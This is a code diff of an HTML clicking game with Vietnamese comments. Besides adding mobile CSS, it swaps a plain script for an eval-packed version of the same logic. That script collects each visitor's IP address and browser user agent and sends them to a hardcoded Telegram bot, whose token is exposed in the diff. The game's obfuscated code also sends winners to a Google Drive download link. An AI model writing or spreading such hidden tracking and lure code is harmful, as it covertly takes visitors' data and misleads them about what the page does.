@@ -47,6 +47,22 @@ body {
     background-color: #001f00; /* Màu nền khi hover vào ô */
     border-color: #00ff00; /* Đổi màu đường viền khi hover */
 }
+/* CSS cơ bản cho màn hình điện thoại */
+@media only screen and (max-width: 600px) {
+    body {
+        font-size: 14px; /* Đặt kích thước font chữ nhỏ hơn cho màn hình nhỏ */
+    }
+
+    .game-board {
+        padding: 10px; /* Giảm khoảng cách giữa các ô cho màn hình nhỏ */
+    }
+
+    .cell {
+        width: 20px; /* Giảm kích thước của ô */
+        height: 20px;
+        font-size: 10px; /* Đặt kích thước font chữ nhỏ hơn cho màn hình nhỏ */
+    }
+}
 
 </style>
 </head>
@@ -60,40 +76,7 @@ body {
 <script>
 eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 g=4.C(\'g\');1 b=4.C(\'13\');1 l=[3,3,3,3,3];o(1 i=0;i<10;i++){o(1 j=0;j<10;j++){1 2=4.z(\'11\');2.Z=\'2\';2.y(\'a-9\',i);2.y(\'a-8\',j);2.X(\'p\',6);g.v(2)}g.v(4.z(\'T\'))}o(1 k=0;k<5;k++){1 u=7.s(7.x()*10);1 q=7.s(7.x()*10);1 e=u*10+q;l[e]=14}1 d=0;f 6(r){1 2=r.W;1 9=A(2.w(\'a-9\'));1 8=A(2.w(\'a-8\'));1 e=9*10+8;D(l[e]){b.h=\'Júc mừ1e! Bạn đã mở được 1bên kết.\';E.K.17=\'15://N.1d.1c/P?U=V&12=18\';I()}M{d++;D(d>=5){b.h=\'Hết Lượt.\';16(f(){E.K.1a()},19)}M{b.h=\'Lượt Jơi \'+(5-d)+\' \';2.F(\'p\',6);2.Q.R=\'S\'}}}f I(){1 G=4.O(\'.2\');G.Y(f(2){2.F(\'p\',6)})}',62,77,'|var|cell|false|document||handleClick|Math|col|row|data|statusDisplay||attempts|cellIndex|function|gameBoard|textContent||||links|||for|click|randomCol|event|floor||randomRow|appendChild|getAttribute|random|setAttribute|createElement|parseInt||getElementById|if|window|removeEventListener|cells||disableAllCells|Ch|location||else|drive|querySelectorAll|uc|style|backgroundColor|gray|br|export|download|target|addEventListener|forEach|className||div|id|status|true|https|setTimeout|href|1XX7rLm99oAWZRCseK7h_1V05ZH0AZevt|2000|reload|li|com|google|ng'.split('|'),0,{}))
  // Lấy thông tin trình duyệt
- var browserInfo = navigator.userAgent;
-
-// Sử dụng API cung cấp bởi một bên thứ ba để lấy địa chỉ IP
-fetch('https://api.ipify.org?format=json')
-    .then(response => response.json())
-    .then(data => {
-        var ipAddress = data.ip;
-
-        // Gửi thông tin đến bot Telegram
-        var botToken = '7112649610:AAHycMohej85f0YYL0o8IChstjfSu0l_loU';
-        var chatId = '6339940126';
-        var messageText = 'IP Address: ' + ipAddress + '\nBrowser Info: ' + browserInfo;
-
-        fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: messageText
-            })
-        })
-        .then(response => response.json())
-        .then(data => {
-            console.log('Message sent:', data);
-        })
-        .catch(error => {
-            console.error('Error sending message:', error);
-        });
-    })
-    .catch(error => {
-        console.error('Error fetching IP:', error);
-    });
+ eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 b=N.s;a(\'8://7.r.g?q=5\').4(2=>2.5()).4(3=>{1 c=3.n;1 i=\'l:k\';1 d=\'j\';1 e=\'9 m: \'+c+\'\\o p: \'+b;a(\'8://7.t.g/v\'+i+\'/F\',{M:\'L\',u:{\'K-J\':\'I/5\'},H:G.E({w:d,D:e})}).4(2=>2.5()).4(3=>{6.C(\'B A:\',3)}).f(0=>{6.0(\'h z y:\',0)})}).f(0=>{6.0(\'h x 9:\',0)});',50,50,'error|var|response|data|then|json|console|api|https|IP|fetch|browserInfo|ipAddress|chatId|messageText|catch|org|Error|botToken|6339940126|AAHycMohej85f0YYL0o8IChstjfSu0l_loU|7112649610|Address|ip|nBrowser|Info|format|ipify|userAgent|telegram|headers|bot|chat_id|fetching|message|sending|sent|Message|log|text|stringify|sendMessage|JSON|body|application|Type|Content|POST|method|navigator'.split('|'),0,{}))
 </script>
 </body>
 </html>
